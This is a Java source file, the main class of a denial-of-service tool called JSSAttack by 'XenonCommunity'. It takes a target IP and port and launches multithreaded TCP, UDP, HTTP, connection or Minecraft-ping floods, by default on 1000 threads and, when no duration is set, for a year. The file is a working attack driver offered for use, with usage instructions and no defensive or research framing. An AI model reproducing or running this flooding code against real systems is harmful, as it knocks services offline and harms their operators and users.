package ir.xenoncommunity.jss;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.methods.impl.*;
import ir.xenoncommunity.jss.utils.*;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.jetbrains.annotations.NotNull;

import java.net.InetAddress;
import java.time.Duration;
import java.time.LocalTime;
import java.util.concurrent.TimeUnit;

@Getter
@RequiredArgsConstructor
public class JSSAttack implements Runnable {
    public final CommandLineParser parser;

    /**
     * Returns the appropriate attack method based on the provided method, byte size, and attack statics.
     *
     * @param method        the attack method
     * @param byteSize      the size of the attack in bytes
     * @param attackStatics the attack statics
     * @return the appropriate attack method
     */
    @NotNull
    private static IAttackMethod getMethod(String method, Integer byteSize, AttackStatics attackStatics) {
        return switch (method.toUpperCase()) {
            case "TCPFLOOD", "TCP", "TCP_FLOOD" -> new TCPFlood(attackStatics, byteSize);
            case "HTTPFLOOD", "HTTP", "HTTP_FLOOD" -> new HTTPFlood(attackStatics);
            case "CONNFLOOD", "CONN", "CONN_FLOOD" -> new ConnFlood(attackStatics);
            case "MCPING", "MCPING_FLOOD", "MCPINGFLOOD" -> new MCPingFlood(attackStatics);
            case "UDPFLOOD", "UDP", "UDP_FLOOD" -> new UDPFlood(attackStatics, byteSize);
            default -> throw new IllegalArgumentException("Invalid method: " + method);
        };
    }

    /**
     * Runs the attack with the specified parameters.
     */
    @SneakyThrows
    public void run() {
        // Parse command line arguments
        final boolean debug = this.parser.get("--debug", Boolean.class, false);
        final String ip = this.parser.get("--ip", String.class, null);
        final Integer port = this.parser.get("--port", Integer.class, -1);
        final Integer ppsLimit = this.parser.get("--pps", Integer.class, -1);
        final Integer maxThreads = this.parser.get("--threads", Integer.class, 1000);
        final Integer byteSize = this.parser.get("--byteSize", Integer.class, 1500);
        final Integer duration = this.parser.get("--duration", Integer.class, -1);
        final String method = this.parser.get("--method", String.class, "TCPFLOOD");
        final Boolean verbose = this.parser.get("--verbose", Boolean.class, false);

        if (ip == null) {
            System.out.println("JSSAttack by XenonCommunity");
            System.out.println("Usage: java -jar JSSAttack.jar --ip <ip> --port <port> --threads <threads> --byteSize <byteSize> --duration <duration> --method <method> [--verbose] [--debug]");
            System.exit(0);
        }

        // Set logging level based on verbosity and debug mode
        if (verbose) {
            Logger.setCurrentLevel(Logger.LEVEL.VERBOSE);
        } else if (debug) {
            Logger.setCurrentLevel(Logger.LEVEL.DEBUG);
        }

        // Log debug information if debug mode is enabled
        Logger.setSection("DEBUG");
        Logger.log(Logger.LEVEL.DEBUG, "IP is: " + ip);
        Logger.log(Logger.LEVEL.DEBUG, "Port is: " + port);
        Logger.log(Logger.LEVEL.DEBUG, "MaxThreads is: " + maxThreads);
        Logger.log(Logger.LEVEL.DEBUG, "ByteSize is: " + byteSize);
        Logger.log(Logger.LEVEL.DEBUG, "Duration is: " + duration);
        Logger.log(Logger.LEVEL.DEBUG, "Method is: " + method);

        // Initialize task manager
        TaskManager taskManager = new TaskManager(maxThreads + 1);

        // Initialize attack parameters
        final AttackStatics attackStatics = new AttackStatics(ppsLimit);
        final IAttackMethod attackMethod = getMethod(method, byteSize, attackStatics);
        final InetAddress addr = InetAddress.getByName(ip);
        final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(duration));

        Logger.log(Logger.LEVEL.DEBUG, "addr: " + addr);

        // Start the attack and log thread creation
        Logger.setSection("ATTACK");
        for (int i = 1; i <= maxThreads; i++) {
            Logger.log(Logger.LEVEL.DEBUG, "Adding new thread." + i + " Max: " + maxThreads);

            taskManager.add(() -> {
                do {
                    try {
                        attackMethod.send(addr, port == -1 ? Randomize.randomPort() : port);
                    } catch (Exception ignored) {

                    }
                } while (attackStatics.isRunning());
            });
        }

        // Log start of attack
        Logger.log(Logger.LEVEL.INFO, "Attacking...");

        // Add task to manage statics for each second
        taskManager.add(() -> {
            while (LocalTime.now().isBefore(endTime) || duration == -1) {
                try {
                    TimeUnit.SECONDS.sleep(1);
                    attackStatics.second();
                } catch (InterruptedException e) {
                    e.printStackTrace(System.err);
                }
            }

            attackStatics.setRunning(false);
        });

        // Perform attack for specified duration or indefinitely
        if (duration == -1) {
            taskManager.doTasks(TimeUnit.DAYS, 365);
            Logger.log(Logger.LEVEL.INFO, "Happy new year!");
            return;
        }

        taskManager.doTasks(TimeUnit.SECONDS, duration);
    }

}